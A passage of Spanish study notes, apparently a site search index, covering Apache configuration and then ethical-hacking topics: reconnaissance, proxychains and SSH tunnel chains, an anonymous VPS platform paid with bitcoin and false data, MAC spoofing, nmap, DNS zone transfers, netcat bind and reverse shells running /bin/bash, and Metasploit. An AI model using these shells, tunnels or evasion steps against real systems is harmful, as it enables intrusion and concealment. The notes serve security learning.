seguida de 0 o mas cabeceras GET /path/file HTTP/1.0 metodo get es siempre sin cuerpo, final de linea es cd y rf \\r\\n curl -s -D /dev/stderr http://seat.es > /dev/null HTTP/1.1 301 Moved Permanently Date: Tue, 19 Nov 2019 10 :57:53 GMT Location: https://www.seat.es/ Content-Length: 228 Content-Type: text/html ; charset = iso-8859-1 Set-Cookie: TS0177e393 = 012f656eaa20722a90edef1d916342e21c1021f54ea8f278cfb73d1720c7998c2394aea1eb5368826345d7be0f88e1232fd6f8f377 ; Path = / /usr/share/doc/python3-docs/html/index.html","title":"Http"},{"location":"administracion/redes/redes2/#directorios","text":"/usr/share/httpd/manual/index.html # manual /etc/httpd/conf/httpd.conf # configuraci\u00f3n /etc/httpd/modules # modulos instalados /var/www/html # directorio publicaci\u00f3n por defecto","title":"Directorios"},{"location":"administracion/redes/redes2/#logs","text":"sudo tail -f /etc/httpd/logs/error_log sudo tail -f /etc/httpd/logs/access_log","title":"logs"},{"location":"administracion/redes/redes2/#configuracion_1","text":"include a directorio en el home apachectl -t verifica ficheros de configuraci\u00f3n execcgi quitar si no quiero ejecutables","title":"Configuraci\u00f3n"},{"location":"administracion/redes/redes2/#alias","text":"https://httpd.apache.org/docs/2.4/es/mod/mod_alias.html https://httpd.apache.org/docs/2.4/es/mod/core.html#options Alias \"/python\" \"/usr/share/doc/python3-docs/html\" <Directory \"/usr/share/doc/python3-docs/html\" > Options +Indexes -ExecCGI -FollowSymLinks Require all granted </Directory>","title":"Alias"},{"location":"administracion/redes/redes2/#userdir","text":"https://httpd.apache.org/docs/2.4/es/mod/mod_userdir.html#userdir https://httpd.apache.org/docs/2.4/es/howto/public_html.html <IfModule mod_userdir.c> UserDir \"public_html\" UserDir enabled isx47787241 </IfModule> <Directory \"/home/users/inf/hisx2/isx47787241/public_html\"> AllowOverride FileInfo AuthConfig Limit Indexes Options MultiViews Indexes SymLinksIfOwnerMatch IncludesNoExec Require method GET POST OPTIONS </Directory> verificar que tenemos los permisos de acceso, almenos 711 hasta el home. y el directorio public_html 755. Ya podemos acceder desde localhost/~jorge Para evitar poner la tilde, usar la expresi\u00f3n regular siguiente en la configuraci\u00f3n. RewriteEngine on RewriteRule ^/personal/ ([ a-z0-9 ] + ) /~ $1 [ R ]","title":"Userdir"},{"location":"administracion/redes/redes2/#includes","text":"https://httpd.apache.org/docs/2.4/es/mod/mod_include.html Alias \"/data\" \"/home/users/inf/hisx2/isx47787241/public_data\" <Directory \"/home/users/inf/hisx2/isx47787241/public_data\" > AddType text/html .html AddOutputFilter INCLUDES ; DEFLATE .html Options +Indexes -ExecCGI -FollowSymLinks +IncludesNoExec Require all granted </Directory> public_data \u251c\u2500\u2500 head.html \u2514\u2500\u2500 index.html index.html <!--#include file=\"head.html\" --> <!--#fsize file=\"head.html\" --> < p > hola mundo </ p > < pre > <!--#printenv --> </ pre >","title":"Includes"},{"location":"administracion/redes/redes2/#virtualhost","text":"https://httpd.apache.org/docs/current/mod/core.html#virtualhost https://httpd.apache.org/docs/2.4/vhosts/examples.html Virtualhost permite servir diferentes paginas desde un mismo host, esto lo hace mirando que tipo de servername le llega en la url, y desde ah\u00ed, distribuye la pagina adecuada. A\u00f1adir a /etc/hosts o dns la ip de virtual host y el alias. ... 192 .168.88.2 jorge.com a\u00f1adir sede virtual al archivo /etc/httpd/conf/httpd.conf # sede virtal <VirtualHost 192 .168.88.2:80> ServerName jorge.com DocumentRoot \"/home/debian/apache/vhost\" </VirtualHost> # permisos de acceso al directorio <Directory \"/home/debian/apache/vhost\" > Options +Indexes -ExecCGI -FollowSymLinks Require all granted </Directory>","title":"VirtualHost"},{"location":"administracion/redes/redes2/#indexes","text":"La opci\u00f3n Indexes permite en el caso de no encontrar un archivo index.html mostrar la p\u00e1gina como si fuera un ftp. Es necesario comentar o renombrar el archivo /etc/http/conf.d/welcom.conf ya que por defecto, si no encuentra la p\u00e1gina index.html lo redirige a la p\u00e1gina de muestra apache2. <Directory \"/home/users/inf/hisx2/isx47787241/public_data\" > AddType text/html .html AddOutputFilter INCLUDES ; DEFLATE .html Options +Indexes -ExecCGI -FollowSymLinks +IncludesNoExec Require all granted </Directory>","title":"Indexes"},{"location":"administracion/redes/redes2/#directorio-de-ejecutables","text":"ExecCGI permite ejecutar archivos y ScriptAlias define un directorio de ejecutables. # conf directorio ejecutable ScriptAlias \"/a\" \"/home/users/inf/hisx2/isx47787241/apache/scripts\" <Directory \"/home/users/inf/hisx2/isx47787241/apache/scripts\" > Options +ExecCGI AddHandler cgi-script .sh .py Require all granted </Directory>","title":"Directorio de ejecutables"},{"location":"administracion/redes/redes2/#mezcla","text":"directorio donde se mezclan archivos ejecutbles con normales html. Alias \"/app\" \"/home/users/inf/hisx2/isx47787241/apache/app1\" <Directory \"/home/users/inf/hisx2/isx47787241/apache/app1\" > Options +Indexes +ExecCGI -FollowSymLinks AddHandler cgi-script .sh Require all granted </Directory>","title":"Mezcla"},{"location":"administracion/redes/redes2/#http-referer","text":"get acaba en cr lf y post en cos body tipo mime de post CONTENT_TYPE=application/x-www-form-urlencoded get curl --silent --dump-header /dev/stderr http://www.escoladeltreball.org > /dev/null post clear;curl --silent --dump-header --data -d @filename http://localhost/app2/script/dump.py","title":"http-referer"},{"location":"administracion/redes/redes2/#auth-usuarios","text":"Generar archivo de contrase\u00f1as de usuarios. htpasswd -b -c passwd pepe contrasena Adding password for user pepe htpasswd -b passwd pepe2 contrasena Adding password for user pepe2 configuraci\u00f3n directorio Alias \"/data\" \"/home/users/inf/hisx2/isxXXXXXXX/public_data\" <Directory \"/home/users/inf/hisx2/isxXXXXXXX/public_data\" > Options +Indexes -ExecCGI -FollowSymLinks Authtype Basic AuthName \"Acces a usuarios\" AuthBasicProvider file AuthUserFile /home/users/inf/hisx2/isxXXXXXXX/apache/passwd Require valid-user </Directory>","title":"Auth usuarios"},{"location":"administracion/redes/redes2/#auto-detectar-idioma","text":"Con esta configuraci\u00f3n el navegador recoger\u00e1 el index.html con el idioma predefinido por el mismo. idiomas \u251c\u2500\u2500 index.html.en \u251c\u2500\u2500 index.html.es \u2514\u2500\u2500 index.html.ca Las opciones que hacen funcioar esto son +MultiViews, LanguagePriority, ForceLanguagePriority Alias \"/idiomas\" \"/home/debian/apache/idiomas\" <Directory \"/home/debian/apache/idiomas\" > LanguagePriority en ca es ForceLanguagePriority Fallback Options -Indexes -ExecCGI -FollowSymLinks +MultiViews Require all granted </Directory>","title":"Auto detectar idioma"},{"location":"administracion/redes/redes2/#likes","text":"el enlace img llama a un script para ejecutar algo antes de mistrarte la imagen apache.conf Alias \"/like\" \"/home/users/inf/hisx2/isx47787241/apache/like\" <Directory \"/home/users/inf/hisx2/isx47787241/apache/like\" > AddType text/html .html Options +Indexes +ExecCGI -FollowSymLinks -IncludesNoExec Require all granted </Directory> index.html <p>hola like</p> <img src = '/cgi-bin/dump.sh' /> dump.sh #!/usr/bin/bash echo $REMOTE_ADDR >> /var/likes/bigdata echo 'Content-Type: image/png; charset=UTF-8' echo cat /home/users/inf/hisx2/isx47787241/Descargas/index.png #!/usr/bin/bash echo $REMOTE_ADDR >> /var/likes/bigdata echo 'Status: 302' echo 'Location: https://upload.wikimedia.org/wikipedia/commons/1/13/Facebook_like_thumb.png' echo","title":"Likes"},{"location":"auditoria/apuntes_hacking/","text":"Haking \u00e9tico Nociones b\u00e1sicas \u00c1mbitos de la seguridad \u00c1mbito f\u00edsico identificar medidas de seguridad, accesos alternativos, evasion de control de acceso RFIC/NFC ( targeta de acceso ), evasi\u00f3n control biometrico, wireles, wifi. \u00c1mbito Digital anonimacion de las comunicaciones, analisis servicios p\u00fablicos, dominios internos, todo lo relacionado al software. \u00c1mbito humano el objetivo de este \u00e1bito es enga\u00f1ar al usuario mediante, vishing ( llamadas telefonicas ), usb cebo, mails con malware , suplantaci\u00f3n de identidad, ingenieria social etc... Pruebas acotadas dentro de Hacking \u00c9tico Ejercicios Read Team. Simulaci\u00f3n de un ataque real donde la empresa desconoce las acciones que van a ser realizadas, cuando y por quien. Test de Intrusi\u00f3n. Pruebas de intrusi\u00f3n con un alcance limitado, donde existe colaboraci\u00f3n entre auditor y empresa. En este caso el \u00e1mbito de actuaci\u00f3n esta definido, la organizaci\u00f3n conoce de parte de los detalles que se ejecutaran y se verifican vulnerabilidades y se explotan de manera limitada. Auditor\u00eda de Vulnerabilidades Identificaci\u00f3n de vulnerabilidades conocidas. Suele estar dirigido a los servicios que especifica la empresa y \u00fanicamente se identifican las vulnerabilidades de dichos servicios. Tipos de enfoques Caja Negra: El desconocimiento completo de cualquier informaci\u00f3n referente al activo a auditar. Este tipo de enfoque es el mas real ya que se simula un atacante real ya que desconoce todos los servicios. Caja Negra con Post-Autentificaci\u00f3n: \u00danicamente se tienen las credenciales de acceso. Este tipo de enfoque se realiza para prevenir vulnerabilidades de m\u00e9todo interno o en lugares que se permite acceder a una red publica etc... Caja gris: Conocimiento parcial del activo a auditar. Caja blanca: Conocimiento completo del activo. Este m\u00e9todo al tener el conocimiento total del activo se pueden identificar el total de las vulnerabilidades de los servicios del activo. Vectores de ataque Ataque dirigido. los ataques dirigidos consiste en un ataque a un objetivo en concreto, se suelen seguir los siguientes pasos. Reconocimiento: de informaci\u00f3n de la empresa o victima a atacar, consiste en identificar todos los posibles accesos. vector de acceso: localizar el acceso m\u00e1s vulnerable y acceder a el mismo. persistencia: una vez dentro asegurarse de que si cierran un m\u00e9todo de entrada puedas acceder por otro, infectando m\u00faltiples dispositivos. movimiento lateral: poder acceder a diferentes redes de la victima y asegurar un libre acceso entre ellas. acceso a los datos: Tener acceso y control de los datos de la victima. Extracci\u00f3n: extraer los datos. Ataque no dirigido Los ataques no dirigidos se lanzan a multitud de dispositivos sin saber su destino. malware : infectar un dispositivo insertando alg\u00fan tipo de programa malicioso. phishing : suplantar la identidad e bancos, polic\u00eda para extraer datos del usuario explotaci\u00f3n masiva : infectar mayor n\u00famero de dispositivos posibles para en un futuro tener el control y hacer un ataque masivo. Dispositivos de seguridad Firewall ( cortafuegos ) Es un software o hardware que es capaz de filtrar el trafico entrante y saliente de la red para prevenir el acceso no deseado a las redes protegidas. red desmilitarizada (DMZ) Es una red aislada intermedia entre internet y la red interna de la organizaci\u00f3n. En este tipo de redes tenemos un primer firewall desde el router a los servidores p\u00fablicos y un segundo firewall para la red interna, de esta manera desde el exterior se podra acceder a los servidores p\u00fablicos y la red interna seguira protegida. Honeypot Es un dispositivo que simula los servicios o dispositivos de nuestra red. esto sirve para que el atacante pierda tiempo intentando manipular estos dispositivos ya que se muestran mas vulnerables y a la vez nos avisa que alguien esta dentro de nuestra red. Sistema de detecci\u00f3n de intrusos (IDS) NIDS: intenta identificar comportamientos an\u00f3malos en la red HIDS: intenta identificar comportamientos an\u00f3malos en los hosts Firewall de aplicaci\u00f3n web (WAF) es un sistema que se pone delante de una aplicaci\u00f3n web e intenta identificar si se esta ejecutando alg\u00fan tipo de ataque y lo corta. Laboratorio de pruebas metasploitable I, II y III: distribuciones dise\u00f1adas para aprender a vulnerar sistemas y servicios. https://www.vulnhub.com/entry/metasploitable-1,28/ https://www.vulnhub.com/entry/metasploitable-2,29/ Web for pentester I y II: vulnerar aplicaciones webmediante la especificaci\u00f3n de diferentes tecnicas y la necesidad de evadir filtros. https://download.vulnhub.com/dvwa/ Owasp broken web applications project: maquina virtual que desplega una gran cantidad de servicios web vulnerables. https://sourceforge.net/projects/owaspbwa/files/ Existen aplicacciones web que se encargan de recopilar maquinas vulnerables. www.vulnhub.com Introducci\u00f3n Kali escanear pagina de cisco, extraer ip's de dominios wget https://www.cisco.com grep \"href=\" index.html | cut -d \"/\" -f3 | grep \"\\.\" | cut -d '\"' -f1 | sort -u > dominios.txt for dom in $( cat dominios.txt ) ; do host $dom | grep \"has address\" | cut -d \" \" -f4 ; done | sort -u > ips_cisco.txt Anonimato Tunelizaci\u00f3n de protocolos consiste en de encapsular un protocolo dentro de otro creando un t\u00fanel. Es utilizado para transformar un protocolo determinado que com\u00fanmente no se permite en una red. para que este proceso sea efectivo tanto cliente como servidor deben establecer los par\u00e1metros de tunelizaci\u00f3n y protocolos que van a utilizar. un ejemplo ser\u00eda camuflar trafico SSH a trav\u00e9s del trafico HTTP, se utilizar\u00eda el tunel del HTTP para enviar trafico SSH. Servidores proxy Un servidor proxy funciona como punto intermedio entre el cliente y el servidor redireccionando las peticiones y respuestas de forma transparente entre ambas. Esto permite ocultar la direcci\u00f3n IP real del cliente, ya que el servidor ver\u00eda unicamente la direcci\u00f3n IP del proxy. Si a esto le sumas un encadenamiento de proxys en diferentes paises o continentes, el trabajo para descubrir la IP origen es mas tedioso. Virtual Private Network (VPN) Es una tecnolog\u00eda que permite crear conexiones privadas entre dos puntos utilizando una red publica como internet. El funcionamiento es que estableces una conexi\u00f3n segura con el servidor VPN y desde all\u00ed sales a internet. Podemos encontrar servicios VPN tanto de pago como gratuitos distribuidos por distintos paises. muy utilizado para evitar intercepciones de 5rafico, conexiones seguras en sitios publicos y anonimizar conexiones. Redes de anonimaci\u00f3n TOR Es la red an\u00f3nima mas conocida a d\u00eda de hoy. Consiste en una red completamente centralizada que aporta anonimato en la navegaci\u00f3n por internet, as\u00ed como acceso a la red de TOR. Este funciona conectandose a traves de varias capas de cifrado en la red de tor, pasando por varios nodos de dicha red y finalmente salir de la red de tor a la red comun sin cifrar pero sin la posibilidad de saber quien eres. A no ser que en dicho mensaje hayan datos personales, por eso mismo no se deve acceder a sitios con identificaci\u00f3n como email, dni, etc... FREENET/I2P Estas dos opciones son muy similares y lo que permiten es tener acceso a la red oculta dentro de internet denominada como Dark Net o Deep Web , esta red tiene la peculiardad de ser una red descentralizada. Proxy Proxychain Es un proxy para enrutar programas, comandos desde el terminal, su configuraci\u00f3n es muy sencilla igual que su modo de uso. Su configuraci\u00f3n se encuentra en /etc/proxychain.conf # modo vervose #quiet_mode # pasar dns por proxy (recomendado) proxy_dns al final del todo, puedes poner tantos como quieras, por defecto viene configurado tor, pero lo puedes quitar o a\u00f1adir debajo los proxys que quieres que valla recorriendo. # tipo de conexion ip puerto user pasword # defaults set to \"tor\" #socks4 127.0.0.1 9050 socks4 88 .78.73.116 1080 Utilizar proxychains con wget. canihazip es una web que nos dice que ip publica tenemos, utilizando proxychains mostrara que tenemos la ip publica 88.78.73.116 proxychains wget http://canihazip.com/s Foxyproxy Un plugin del navegador donde puedes configurar tus proxy y cambiar entre ellos r\u00e1pidamente. VPN Con una VPN creas un t\u00fanel seguro hasta el servidor de la VPN y sale tu conexi\u00f3n de all\u00ed a la red. existen VPN gratuitas o opensource como openvpn o de pago . Vpn de pago: Estos servicios de pago normalmente tienen un software de instalaci\u00f3n para su utilizaci\u00f3n sencilla. Adem\u00e1s te permite conectar a trav\u00e9s de diferentes pa\u00edses ya que tienen servidores distribuidos por los diferentes continentes. ExpressVPN - Caribe NordVPN - Panama TorGuard - Antillas IPredator - Chipre PureVPN - Hong kong Cambiar Mac En ocasiones es \u00fatil cambiar la mac de un ordenador para burlar listas blancas etc... windows administrador de dispositivos adaptadores de red opciones avanzadas direcci\u00f3n administrada localmente --> valor linux ifconfig eth0 down macchanger -m 00 :11:22:33:44:55 eth0 ifconfig eth0 up # cambio random macchanger -r # cambio permanente macchanger -p Creando plataforma an\u00f3nima Para crear una plataforma an\u00f3nima (\"legalmente\") se han de seguir diferentes pasos. Contrataci\u00f3n an\u00f3nima de servidores VPS distribuidos en diferentes lugares ( comprarlos o alquilarlos con bitcoins y datos falsos ). Enlazar los servidores con t\u00faneles para un manejo fluido a la hora de ejecutar operaciones. Creando t\u00faneles Activar ssh en todos los vps host1 192 .168.122.1 host2 192 .168.122.2 host3 192 .168.122.3 T\u00fanel Est\u00e1tico Un t\u00fanel est\u00e1tico redirige las peticiones de un puerto local a otro host remoto en el puerto indicado. # desde host2 # se conecta a host3 y se deja el tunel abierto ssh -L 1234 :192.168.122.3:22 root@192.168.122.3 # desde otra terminal de host2 ssh root@127.0.0.1 -p 1234 root@host3:~ $_ Esta opci\u00f3n 1234:192.168.122.3:22 ejecutada desde host2 esta diciendo, abre el puerto 1234 en host2 y todo lo que entre por ah\u00ed, lo rediriges a host3 en el puerto 22. Por eso al hacer el ssh en al puerto 1234 en host2 conectas a host3. T\u00fanel din\u00e1mico Un t\u00fanel din\u00e1mico redirige las peticiones de un puerto local a otro host remoto sin importar el puerto destino. # desde host2 # establezco tunel dinamico desde host2 a host3 ssh -D 1234 root@192.168.122.3 # host2 tiene abierto el puerto 1234 y redirige a host3 # desde otra terminal en host2 configuro proxychains para conectar con el puerto que acabo de abrir. cp /etc/proxychains.cong ./ vim proxychains.conf # ultima linea 127 .0.0.1 1234 # ahora todo lo que se ejecute con proxychains se reenviara a host3 root@host2~$ proxychains ssh root@127.0.0.1 root@host3~ $_ Esto al ser solo un salto entre host no tiene mucho sentido ya que arias un ssh simple y ya. todo cobra sentido al a\u00f1adir mas hosts en la ecuaci\u00f3n. Secuencia de T\u00faneles En este caso crearemos una mezcla de t\u00faneles din\u00e1micos y est\u00e1ticos, el host final con el pen\u00faltimo tendr\u00e1n un t\u00fanel din\u00e1mico para poder lanzar cualquier tipo de petici\u00f3n, todos los dem\u00e1s host de la cola se conectaran mediante t\u00faneles est\u00e1ticos para saber por que puerto seguir dicha cola. Utilizaremos 3 host porque poner mas es repetir lo mismo una y otra vez, host3 sera el host final, conectara el host2 con el host3 mediante un t\u00fanel din\u00e1mico y luego el host1 conectara con host2 mediante un t\u00fanel est\u00e1tico. De esta manera los comandos ejecutados desde el host1 saldr\u00e1n por el host3. # desde host2 # establezco tunel dinamico desde host2 a host3 ssh -D 1234 root@192.168.122.3 # host2 tiene abierto el puerto 1234 y redirige a host3 # desde otra terminal en host2 configuro proxychains para conectar con el puerto que acabo de abrir. cp /etc/proxychains.cong ./ vim proxychains.conf # ultima linea 127 .0.0.1 1234 # desde host1 cp /etc/proxychains.cong ./ vim proxychains.conf # ultima linea 127 .0.0.1 4321 # crear t\u00fanel est\u00e1tico y dejar abierto ssh -L 4321 :127.0.0.1:1234 root@192.168.122.2 # ----- comprobar que funciona ----------------------- # desde otro terminal de host1 abro un puerto nc -lvvp 6666 # desde otro terminal host1 proxychains nc 192 .168.122.1 6666 conexion a 192 .168.122.1 desde 192 .168.122.3 # desde host1 conectar con host final proxychains ssh root@127.0.0.1 root@host3~ $_ para a\u00f1adir mas nodos solo se tendr\u00eda que repetir las acciones echas en el host1 cambiando los puertos correspondientes y la ip del nodo a seguir. Identificaci\u00f3n y explotaci\u00f3n de vulnerabilidades en sistemas Metodolog\u00eda Para lograr auditar y vulnerar un sistema es necesario seguir una serie de pautas. Obtenci\u00f3n de datos: recolectar la m\u00e1xima informaci\u00f3n de los dispositivos de una organizaci\u00f3n, as\u00ed como servicios p\u00fablicos, etc... Enumeraci\u00f3n de sistemas: enumerar y organizar que sistemas o redes tiene dicha organizaci\u00f3n y versiones de dichos sistemas o servicios. An\u00e1lisis de vulnerabilidades: identificar las vulnerabilidades conocidas para cada sistema o servicio de la organizaci\u00f3n. Explotaci\u00f3n de vulnerabilidades: intentar acceder al dispositivo a trav\u00e9s de alguna vulnerabilidad. Post-extracci\u00f3n de vulnerabilidades: una vez dentro del sistema exportar datos sensibles, pivotar entre redes, asegurar conexiones futuras, etc... Documentaci\u00f3n. Obtenci\u00f3n de datos Para la primera identificaci\u00f3n de datos se puede utilizar el comando whois o una aplicaci\u00f3n web similar a whois.domaintools.com de esta manera podremos extraer datos como: dns, n\u00fameros de tel\u00e9fono, localizaci\u00f3n y alg\u00fan dato \u00fatil mas. whois gencat.cat ... Registrant Name: Generalitat de Catalunya Registrant Organization: Generalitat de Catalunya Registrant Street: Via Laietana, 14 Registrant City: Barcelona Registrant State/Province: Registrant Postal Code: 08003 Registrant Country: ES Registrant Phone: +34.935676330 Registrant Email: dominis.ctti@gencat.cat ... Name Server: a16-65.akam.net Name Server: a1-133.akam.net Name Server: a11-64.akam.net .... Es importante hacer la resoluci\u00f3n de dominio para obtener la ip y volver a buscar con whois mas informaci\u00f3n. Recolecci\u00f3n de datos Para empezar a auditar una organizaci\u00f3n necesitamos obtener todos los sistemas aut\u00f3nomos a los que pertenece si es que los tiene, para despu\u00e9s extraer todos los rangos de ip publicas en las que se aloja, para extraer todos los dominios y subdominios que pertenece a dicha organizaci\u00f3n. Esta labor es lenta y bastante pesada ya que hay que estar atento a los detalles y en seg\u00fan que organizaci\u00f3n la cantidad de datos extra\u00eddos ser\u00e1 muy alta. An\u00e1lisis de direcciones ip Para la extracci\u00f3n de direcciones ip existen aplicaciones como www.robtex.com que nos facilitara el trabajo. Esta aplicaci\u00f3n mediante un dominio o una direcci\u00f3n ip extrae una buena informaci\u00f3n como dns, subdominios, etc... Curiosidad Se puede utilizar robtex para evitar los filtros que tienen algunas webs como mailinator o guerrillamail. Estas dos opciones son de correo basura temporal, lo primero que tenemos que hacer es a\u00f1adir el dominio de guerrillamail.com a robtex. En el apartado shared buscar using as mail server o partially sharing ip numbers . Este apartado devuelve los dominios y subdominios que apuntan a la ip del dominio principal. Por ultimo al enviar un email cambiar el dominio que nos a dado la web de guerrilla en el email, normalmente @sharklasers.com por el que hemos extra\u00eddo de robtex. An\u00e1lisis de sistemas aut\u00f3nomos Un Sistema Aut\u00f3nomo (en ingl\u00e9s , Autonomous System : AS ) se define como \u201cun grupo de redes IP que poseen una pol\u00edtica de rutas propia e independiente\u201d. Esta definici\u00f3n hace referencia a la caracter\u00edstica fundamental de un Sistema Aut\u00f3nomo: realiza su propia gesti\u00f3n del tr\u00e1fico que fluye entre \u00e9l y los restantes Sistemas Aut\u00f3nomos que forman Internet. Un n\u00famero de AS o ASN se asigna a cada AS, el que lo identifica de manera \u00fanica a sus redes dentro de internet. Esto lo utilizan las organizaciones para tener mayor velocidad entre todos sus dominios y subdominios. Para la extracci\u00f3n y analisis de sistemas aut\u00f3nomos se pueden utilizar aplicaciones como www.ipv4info.com o bgphurricane Se puede buscar por dominio, ip , nombre sistema aut\u00f3nomo o nombre de la compa\u00f1\u00eda. De esta manera extraeremos todos los sistemas aut\u00f3nomos de la organizaci\u00f3n, sus rangos de ip p\u00fablicos y sus dominios. An\u00e1lisis de dominios y subdominios Una buena aplicaci\u00f3n para extraer subdominios es www.dnsdumpster.com , en ella le insertaremos el dominio a buscar y extraer\u00e1 sus subdominios junto a sus ip correspondientes. Browser Hacking Operadores de b\u00fasqueda site:udemy.com # datos en udemy - # negacion #10..19# # rango intitle:\"index of /\" # buscar en titulo allintitle:\"index of /\" # busca en titulo exactamente \"index of /\" inurl:\"admin.php\" # buscar en la url intext:\"admin\" intext:\"password\" # buscar exclusibamente en el texto filetype:pdf # ficheros pdf ext:pdf # extensiones pdf inurl:admin && ext:sql # and (inurl:admin OR ext:sql ) # or google hacking database Herramienta para facilitar el an\u00e1lisis maltego es una herramienta gr\u00e1fica para recopilar informaci\u00f3n de una organizaci\u00f3n utiliza las aplicaciones anteriores como robtex, whois y otras para extraer toda la informaci\u00f3n. Al instalar maltego requiere la versi\u00f3n 8 de java para su funcionamiento, dejo una opci\u00f3n para su cambio r\u00e1pido de versi\u00f3n en el sistema. sudo update-alternatives --config java [ sudo ] password for debian: Existen 2 opciones para la alternativa java ( que provee /usr/bin/java ) . Selecci\u00f3n Ruta Prioridad Estado ------------------------------------------------------------ * 0 /usr/lib/jvm/java-11-openjdk-amd64/bin/java 1111 modo autom\u00e1tico 1 /usr/lib/jvm/java-11-openjdk-amd64/bin/java 1111 modo manual 2 /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java 1081 modo manual recorn-ng es otra aplicaci\u00f3n de terminal para recopilar informaci\u00f3n de una organizaci\u00f3n. recorn-ng [ recon-ng ][ default ] > workspaces add udemy [ recon-ng ][ udemy ] > add domains udemy.com [ recon-ng ][ udemy ] > show modules [ recon-ng ][ udemy ] > use recon/domains-hosts/hackertarget [ recon-ng ][ udemy ][ hackertarget ] > show info [ recon-ng ][ udemy ][ hackertarget ] > set SOURCE udemy.com SOURCE = > udemy.com [ recon-ng ][ udemy ][ hackertarget ] > run --------- UDEMY.COM --------- [ * ] [ host ] mx01.udemy.com ( 104 .16.91.52 ) [ * ] [ host ] web1.udemy.com ( 104 .16.91.52 ) [ * ] [ host ] mail1.udemy.com ( 104 .16.91.52 ) [ * ] [ host ] server1.udemy.com ( 104 .16.91.52 ) ... theharvester python theHarvester.py -d udemy.com -l 500 -b google Extracci\u00f3n metadatos foca es un programa de windows para extraer los metadatos de archivos, a su vez si insertas un dominio busca todos los archivos p\u00fablicos en ese dominio y los analiza. Enumeraci\u00f3n Una vez ya hemos recolectado toda la informaci\u00f3n de la organizaci\u00f3n, queda verificar que dispositivos est\u00e1n activos en los rangos y extraer versiones de servicios o sistemas operativos. De forma pasiva existen diferentes aplicaciones muy \u00fatiles. shodan dados unos patrones de b\u00fasqueda extrae datos sobre servicios, sistemas o puertos, entre otras. apache country:es net:150.224.0.0/16 port:80 title:portal org: \"Universidad autonoma de madrid\" zoomeye es muy similar a shodan. censys es similar a las anteriores con la opci\u00f3n de buscar por tipo certificado. De forma activa, tenemos las siguientes opciones: nmap puede extraer puertos abiertos, sistema operativo o versi\u00f3n del servicio. ( es un poco lento ) nmap -Pn 10 .1.1.0/24 # forzar escaneo todos los dispositivos -sT # servicios tcp -sU # servicios udp -p 443 ,80 # puertos -p- # todos los puertos -n # no hacer resolucion dns -T1 -T5 # t1 escaneo lento t5 rapido --top-ports = 10 --open # buscar top 10 puertos y mostrar solo abiertos -iL fichero-de-ips -sV # version servicio -O # version de sistema operativo -sC # lanzar scripts para interactuar con puertos -A # equivale a (-sV -sC -O tracerouter) netcat/nc Examina los puertos abiertos r\u00e1pidamente. nc -zvn 192 .168.88.4 22 -80 -z # escanea y lista servicios -v # vervose -n # no hacer resoluciones dns mediante dns podemos extraer datos de los dns mal configurados con las siguientes herramientas. Pedir al dns que haga una transferencia de zona y nos env\u00ede todos sus datos, est solo funcionara si esta mal configurado. host -t axfr udemy.com dig axfr @SERVIDOR.DNS udemy.com Extraer datos el dns dnsenum -enum udemy.com dnsenum -s 5 -p 5 udemy.com dnsrecon -ad udemy.com # intntar extraer subdominios dnsrecon -d udemy.com -t [ crt,goo,bing,axfr... ] dnsrecon -d escoladeltreball.org -D /home/debian/dicionario -t brt fierce -dns udemy.com An\u00e1lisis En el an\u00e1lisis nos dedicaremos a detectar las vulnerabilidades y explotarlas para intentar obtener el control del sistema. dos p\u00e1ginas muy utilizadas donde encontrar diferentes tipos de exploits son https://www.exploit-db.com , https://www.securityfocus.com . Detecci\u00f3n vulnerabilidades Se pueden detectar vulnerabilidades de forma manual o autom\u00e1tica, si tenemos un gran n\u00famero de dispositivos la forma manual es inviable, pero si solo queremos explotar un servicio es una opci\u00f3n. las aplicaciones mas conocidas para la detecci\u00f3n de vulnerabilidades son: nessus , http://www.openvas.org/ . detectar versi\u00f3n de smb y sus caracter\u00edsticas: nmap -p445 -T4 -sT -A 10 .0.0.1 enum4linux -t 10 .0.0.1 Tipolog\u00eda de exploits Cuando hablamos de un exploit nos referimos al software que permite tomar cierta ventaja de una vulnerabilidad ya sea para acceder al sistema, elevar privilegios, realizar denegaci\u00f3n de servicios, etc... Exploits remotos: Son aquellos que se lanzan de forma remota a aquellos dispositivos que se tiene visibilidad. Exploits locales: son aquellos que se lanzan una vez ya estas dentro del sistema, normalmente para elevar privilegios. Exploits del lado del cliente: Son los que se lanzan normalmente a una plataforma web y afectara a los clientes que se conecten a dicha plataforma. Tipos de conexi\u00f3n Conexi\u00f3n directa En la conexi\u00f3n directa accedes estableces un t\u00fanel desde el host atacante al vulnerable, el vulnerable tendr\u00e1 un puerto abierto en escucha y conectaremos contra \u00e9l. Este tipo de conexiones es posible que fallen ya que en el firewall se acede desde fuera hacia adentro y si esta bien configurado lo filtrara. # host vulnerable abre puerto de escucha nc -lvvp 1234 -e /bin/bash # atacante se conecta a puerto conocido nc 10 .0.0.5 1234 ~# _ Conexi\u00f3n inversa En esta conexi\u00f3n lo que se crea un t\u00fanel que sale del host vulnerable al host atacante, de esta forma en la gran mayor\u00eda de firewalls no lo filtraran. El modo de uso es el atacante abre un puerto a la escucha y el vulnerable mediante un exploit se conectara al atacante. # atacante abre su puerto nc -lvvp 1234 # vulnerable se conecta al atacante nc 10 .0.0.6 -e /bin/bash Metasploit Metasploit es una herramienta que facilita mucho la hora de explotar una vulnerabilidad, b\u00e1sicamente trabaja con una base de datos donde se encuentran todos sus exploits y luego ejecuta un payload, que ser\u00eda la acci\u00f3n que quieres hacer al haber accedido al sistema. tambi\u00e9n tiene la aplicaci\u00f3n artimage que seria su equivalente gr\u00e1fica, aun que tiene un rendimiento menor. Toda la informaci\u00f3n de metasploit se encuentra en /usr/share/metasploid-framework/ y dentro de modules/exploits/ se encuentran todos los exploits que utiliza, si quisi\u00e9ramos a\u00f1adir alguno, solo tendr\u00edamos que copiarlo en este directorio. Al iniciar metasploit lo primero que tenemos que comprobar es que la base de datos esta bien conectada. msfconsole # iniciar metasploit msf> search ms08 # hacer busqueda en bd # en el caso de no tener BDatos msf> exit msfdb init # volver aentrar y comprobar msfconsole msf> db_status msf> db_rebuild_cache workspaces Para organizarnos en caso de hacer varias tareas a la vez usaremos diferentes espacios de trabajo. workspace -h # help workspace -a udemy # crear spacio udemy workspace -d udemy # eliminar udemy workspace udemy # entrar en espacio udemy workspace # ver espacios disponibles Exploit con el exploit lo que hacemos es atacar la vulnerabilidad. search ms08 # buscar la vulnerabilidad que queremos use exploit/windows/smb/ms08_067_netapi # cargarla show info # ver informaci\u00f3n show options # ver opciones de parametros requeridos set # a\u00f1adir parameros Por cada exploit en la p\u00e1gina https://www.rapid7.com/db 